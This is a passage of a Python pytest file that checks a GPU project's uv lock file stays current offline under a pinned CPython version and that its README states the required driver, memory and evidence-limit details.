    if platform.python_version() != "3.12.16":
        pytest.skip("CPython 3.12.16 interpreter required; lock currency NOT checked")
    env = {k: v for k, v in os.environ.items() if k != "VIRTUAL_ENV"}
    env.update({"UV_NO_CACHE": "1", "UV_OFFLINE": "1", "UV_PYTHON_DOWNLOADS": "never"})
    before = (GPU / "uv.lock").read_bytes()
    result = subprocess.run(
        [uv, "lock", "--check", "--offline", "--no-python-downloads", "--python", sys.executable],
        cwd=GPU,
        env=env,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    assert result.returncode == 0, result.stderr[-2000:]
    assert (GPU / "uv.lock").read_bytes() == before


def test_readme_names_the_writer_driver_range_and_evidence_limits():
    text = (GPU / "README.md").read_text()
    for required in (
        "OPE-579 lane",
        "must name the",
        "580.65.06",
        "Peak memory",
        "Bounded fit",
        "Fresh-process replay",
        "NF4 QLoRA first",
        "bf16 LoRA",
        "Component evidence only",
        "Unverified: the toolkit check may not run in CDI mode",
        "whether the container toolkit injected the GPU",
        "The image sets `PYTHONSAFEPATH=1`.",
    ):
        assert required in text, required
    assert (
        json.loads((ROOT / "tools/toolchain.json").read_text())["gpu_qualification"]["status"]
        == "NOT_RUN"
    )
